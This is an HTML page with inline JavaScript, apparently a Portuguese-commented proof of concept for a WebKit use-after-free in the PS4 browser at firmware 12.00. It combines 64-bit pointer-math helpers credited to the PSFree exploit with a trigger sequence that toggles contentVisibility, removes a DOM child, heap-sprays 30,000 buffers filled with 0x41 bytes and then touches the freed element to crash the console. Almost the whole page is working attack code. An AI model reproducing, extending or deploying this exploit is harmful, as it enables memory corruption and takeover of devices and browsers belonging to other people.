<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit UaF Crash Test (v12.00)</title>
    <style>
        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
        .container { 
            border: 2px dashed #333; 
            padding: 20px; 
            margin-bottom: 20px; 
            background: #fff;
        }
        .child { 
            width: 100px; 
            height: 100px; 
            background-color: blue; 
            border: 2px solid darkblue;
        }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #d32f2f; color: white; border: none; }
        button:hover { background-color: #b71c1c; }
        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; white-space: pre-wrap; }
    </style>
</head>
<body>

    <h2>WebKit UaF Crash Verification (PS4 v12.00)</h2>
    <p>Atenção: Este teste pode travar o navegador ou o console.</p>
    <button onclick="runExploit()">TENTAR CRASH (Iniciar PoC)</button>

    <div class="container">
        <div class="child"></div>
    </div>

    <div id="log-area"><h3>Logs:</h3></div>

<script>
/* ==========================================
   PARTE 1: int64.mjs (Matemática de Ponteiros - Original PSFree)
   ========================================== */

function check_range(x) {
    return (-0x80000000 <= x) && (x <= 0xffffffff);
}

function unhexlify(hexstr) {
    if (hexstr.substring(0, 2) === "0x") {
        hexstr = hexstr.substring(2);
    }
    if (hexstr.length % 2 === 1) {
        hexstr = '0' + hexstr;
    }
    if (hexstr.length % 2 === 1) {
        throw TypeError("Invalid hex string");
    }

    let bytes = new Uint8Array(hexstr.length / 2);
    for (let i = 0; i < hexstr.length; i += 2) {
        let new_i = hexstr.length - 2 - i;
        let substr = hexstr.slice(new_i, new_i + 2);
        bytes[i / 2] = parseInt(substr, 16);
    }

    return bytes;
}

function operation(f, nargs) {
    return function () {
        if (arguments.length !== nargs)
            throw Error("Not enough arguments for function " + f.name);
        let new_args = [];
        for (let i = 0; i < arguments.length; i++) {
            if (!(arguments[i] instanceof Int)) {
                new_args[i] = new Int(arguments[i]);
            } else {
                new_args[i] = arguments[i];
            }
        }
        return f.apply(this, new_args);
    };
}

class Int {
    constructor(low, high) {
        let buffer = new Uint32Array(2);
        let bytes = new Uint8Array(buffer.buffer);

        if (arguments.length > 2) {
            throw TypeError('Int takes at most 2 args');
        }
        if (arguments.length === 0) {
            throw TypeError('Int takes at min 1 args');
        }
        let is_one = false;
        if (arguments.length === 1) {
            is_one = true;
        }

        if (!is_one) {
            if (typeof (low) !== 'number'
                && typeof (high) !== 'number') {
                throw TypeError('low/high must be numbers');
            }
        }

        if (typeof low === 'number') {
            if (!check_range(low)) {
                throw TypeError('low not a valid value: ' + low);
            }
            if (is_one) {
                high = 0;
                if (low < 0) {
                    high = -1;
                }
            } else {
                if (!check_range(high)) {
                    throw TypeError('high not a valid value: ' + high);
                }
            }
            buffer[0] = low;
            buffer[1] = high;
        } else if (typeof low === 'string') {
            bytes.set(unhexlify(low));
        } else if (typeof low === 'object') {
            if (low instanceof Int) {
                bytes.set(low.bytes);
            } else {
                if (low.length !== 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(low);
            }
        } else {
            throw TypeError('Int does not support your object for conversion');
        }

        this.buffer = buffer;
        this.bytes = bytes;

        this.eq = operation(function eq(b) {
            const a = this;
            return a.low() === b.low() && a.high() === b.high();
        }, 1);

        this.neg = operation(function neg() {
            let type = this.constructor;
            let low = ~this.low();
            let high = ~this.high();
            let res = (new Int(low, high)).add(1);
            return new type(res);
        }, 0);

        this.add = operation(function add(b) {
            let type = this.constructor;
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);

        this.sub = operation(function sub(b) {
            let type = this.constructor;
            b = b.neg();
            let low = this.low();
            let high = this.high();
            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();
            low &= 0xffffffff;
            high &= 0xffffffff;
            return new type(low, high);
        }, 1);
    }

    low() { return this.buffer[0]; }
    high() { return this.buffer[1]; }

    toString(is_pretty) {
        if (!is_pretty) {
            let low = this.low().toString(16).padStart(8, '0');
            let high = this.high().toString(16).padStart(8, '0');
            return '0x' + high + low;
        }
        let high = this.high().toString(16).padStart(8, '0');
        high = high.substring(0, 4) + '_' + high.substring(4);
        let low = this.low().toString(16).padStart(8, '0');
        low = low.substring(0, 4) + '_' + low.substring(4);
        return '0x' + high + '_' + low;
    }
}
Int.Zero = new Int(0);
Int.One = new Int(1);


/* ==========================================
   PARTE 2: utils.mjs (Utilitários)
   ========================================== */

function debug_log(msg) {
    // Adiciona timestamp para melhor tracking
    let time = new Date().toLocaleTimeString();
    let textNode = document.createTextNode(`[${time}] ${msg}`);
    let p = document.createElement("p");
    p.appendChild(textNode);
    let logArea = document.getElementById("log-area") || document.body;
    logArea.appendChild(p);
    // Auto-scroll para o final
    p.scrollIntoView(); 
    console.log(msg);
}

function align(a, alignment) {
    if (!(a instanceof Int)) {
        a = new Int(a);
    }
    const mask = -alignment & 0xffffffff;
    let type = a.constructor;
    let low = a.low() & mask;
    return new type(low, a.high());
}


/* ==========================================
   PARTE 3: poc.js (Lógica do Exploit MODIFICADA)
   ========================================== */

let container;
let child;

function initDomElements() {
    container = document.querySelector(".container");
    child = document.querySelector(".child");
}

function heapSpray() {
  debug_log(">>> Iniciando Heap Spray AGRESSIVO (30k objetos)...");
  debug_log("Isso vai causar LAG. Aguarde...");
  
  let spray = [];
  // AUMENTADO DE 10000 PARA 30000 PARA MAIOR PROBABILIDADE DE COLISÃO
  for (let i = 0; i < 30000; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41; // 'A'
    }
    spray.push(arr);
  }
  
  debug_log(">>> Heap Spray concluído.");
  return spray;
}

function triggerUAF() {
  if(!container || !child) {
      initDomElements();
      if(!child) { 
          debug_log("Recriando elemento filho para nova tentativa...");
          child = document.createElement("div");
          child.className = "child";
          container.appendChild(child);
      }
  }

  // Passo 1: Ocultar (Prepara o estado sujo)
  container.style.contentVisibility = "hidden";
  
  // Passo 2: Remover (Free)
  child.remove();
  
  // Passo 3: Corrida contra o tempo (Use)
  setTimeout(() => {
    // 3.1: Trigger da recomputação (Acessa memória liberada)
    container.style.contentVisibility = "auto";
    
    // 3.2: Spray imediato para sobrescrever a memória liberada
    let spray = heapSpray();
    
    debug_log("!!! Spray finalizado. Tentando acessar objeto 'zumbi' !!!");
    
    // --- VERIFICAÇÃO DE CORRUPÇÃO (TRIGGER DE CRASH) ---
    try {
        // Tenta ler propriedades do objeto que deveria ter sido destruído.
        // Se o ponteiro interno dele agora aponta para 0x41414141 (nosso spray),
        // o console DEVE travar (Erro CE-34878-0 ou reboot) ao tentar ler esse endereço.
        
        let width = child.getBoundingClientRect().width;
        let txt = child.innerText; 
        
        // Se o código chegou aqui, o browser sobreviveu (Mau sinal para o exploit)
        debug_log("❌ FALHA: O navegador não travou.");
        debug_log("Motivo: O objeto foi limpo corretamente ou o Spray não acertou o endereço.");
        debug_log("Valor lido (Width): " + width);
        
    } catch(e) {
        // Em um cenário de UaF real bem-sucedido, o catch pode nem rodar, 
        // pois o processo morre antes. Mas se for um erro parcial:
        debug_log("⚠️ Erro JS capturado: " + e.message);
    }
    // ----------------------------------------------------
    
  }, 0);
}

// Configuração do MutationObserver (Desabilitado o auto-loop para evitar confusão no teste de crash)
const observer = new MutationObserver(() => {
  // debug_log("DOM modificado. (Auto-restart desativado para este teste)");
});

function runExploit() {
    initDomElements();
    observer.observe(container, { childList: true, subtree: true });
    
    debug_log("Iniciando sequência...");
    triggerUAF();
}

</script>
</body>
</html>
